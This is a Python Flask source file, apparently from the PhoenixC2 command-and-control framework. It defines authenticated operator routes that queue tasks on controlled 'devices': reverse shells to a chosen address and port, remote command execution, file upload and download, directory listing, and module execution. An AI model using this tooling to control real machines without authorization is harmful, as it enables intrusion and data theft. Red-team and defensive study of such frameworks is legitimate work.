from flask import Blueprint, jsonify, render_template, request

from phoenixc2.server.commander import Commander
from phoenixc2.server.database import (DeviceModel, LogEntryModel, Session,
                                     TaskModel, UserModel)
from phoenixc2.server.utils.web import generate_response

TASK_CREATED = "Task created."
DEVICE_DOES_NOT_EXIST = "Device does not exist."


def devices_bp(commander: Commander):
    devices_bp = Blueprint("devices", __name__, url_prefix="/devices")

    @devices_bp.route("/", methods=["GET"])
    @UserModel.authorized
    def get_devices():
        use_json = request.args.get("json", "").lower() == "true"
        device_query = Session.query(DeviceModel)
        devices: list[DeviceModel] = device_query.all()
        if use_json:
            return jsonify([device.to_dict(commander) for device in devices])
        opened_device = device_query.filter_by(id=request.args.get("open")).first()
        return render_template(
            "devices.j2", devices=devices, opened_device=opened_device
        )

    @devices_bp.route("/<string:id>/clear", methods=["POST"])
    @UserModel.authorized
    def post_clear_devices(id: str = "all"):
        count = 0
        for device in (
            Session.query(DeviceModel).all()
            if id == "all"
            else Session.query(DeviceModel).filter_by(id=id).all()
        ):
            if not device.connected:
                count += 1
                device.delete()
        Session.commit()
        if count > 0:
            LogEntryModel.log(
                "info",
                "devices",
                f"Cleared {count} devices.",
                UserModel.get_current_user(),
            )
        return generate_response("success", f"Cleared {count} devices.", "devices")

    @devices_bp.route("/<int:id>/reverse_shell", methods=["POST"])
    @UserModel.authorized
    def post_reverse_shell(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        address = request.form.get("address")
        port = request.form.get("port")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        try:
            task = TaskModel.reverse_shell(device, address, port)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            LogEntryModel.log(
                "info",
                "devices",
                f"Created reverse shell task for '{device.name}'.",
                UserModel.get_current_user(),
            )
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/rce", methods=["POST"])
    @UserModel.authorized
    def post_rce(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        cmd = request.form.get("cmd")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        try:
            task = TaskModel.remote_command_execution(device, cmd)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            LogEntryModel.log(
                "info",
                "devices",
                f"Created remote command execution task for '{device.name}'.",
                UserModel.get_current_user(),
            )
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/info", methods=["GET"])
    @UserModel.authorized
    def get_infos(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        try:
            task = TaskModel.get_infos(device)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            LogEntryModel.log(
                "info",
                "devices",
                f"Created get infos task for '{device.name}'.",
                UserModel.get_current_user(),
            )
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/dir", methods=["GET"])
    @UserModel.authorized
    def get_dir(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        directory = request.args.get("dir")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        try:
            task = TaskModel.list_directory_contents(device, directory)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
        else:
            LogEntryModel.log(
                "info",
                "devices",
                f"Created list directory contents task for '{device.name}'.",
                UserModel.get_current_user(),
            )
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/upload", methods=["POST"])
    @UserModel.authorized
    def post_upload(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        target_path = request.args.get("path")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        # check if file is in request
        if "file" not in request.files:
            return generate_response("danger", "The file is missing", "devices", 400)

        if target_path is None:
            return generate_response(
                "danger", "Upload path is missing.", "devices", 400
            )
        try:
            task = TaskModel.upload(device, request.files.get("file"), target_path)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            LogEntryModel.log(
                "info",
                "devices",
                f"Created upload task for '{device.name}'.",
                UserModel.get_current_user(),
            )
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/download", methods=["GET"])
    @UserModel.authorized
    def get_download(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        target_path = request.args.get("path")

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        if target_path is None:
            return generate_response("danger", "File path is missing.", "devices", 400)
        try:
            task = TaskModel.download(device, target_path)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "/devices", 500)
        else:
            LogEntryModel.log(
                "info",
                "devices",
                f"Created download task for '{device.name}'.",
                UserModel.get_current_user(),
            )
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    @devices_bp.route("/<int:id>/module", methods=["POST"])
    @UserModel.authorized
    def post_execute_module(id: int = None):
        use_json = request.args.get("json", "").lower() == "true"
        path = request.form.get("path")
        execution_method = request.form.get("method")
        data = request.form.get("data", {})

        # check if device exists
        device = Session.query(DeviceModel).filter_by(id=id).first()
        if device is None:
            return generate_response("danger", DEVICE_DOES_NOT_EXIST, "devices", 404)

        if path is None:
            return generate_response(
                "danger", "Module path is missing.", "devices", 400
            )
        try:
            data = dict(data)
        except Exception:
            return generate_response(
                "danger", "Data is not a valid JSON object.", "devices", 400
            )
        try:
            task = TaskModel.execute_module(device, path, execution_method, data)
            Session.add(task)
            Session.commit()
        except Exception as e:
            return generate_response("danger", str(e), "devices", 500)
        else:
            LogEntryModel.log(
                "info",
                "devices",
                f"Created module execution task for '{device.name}'.",
                UserModel.get_current_user(),
            )
            if use_json:
                return task.to_dict(commander, False)
            else:
                return generate_response("success", TASK_CREATED, "devices")

    return devices_bp
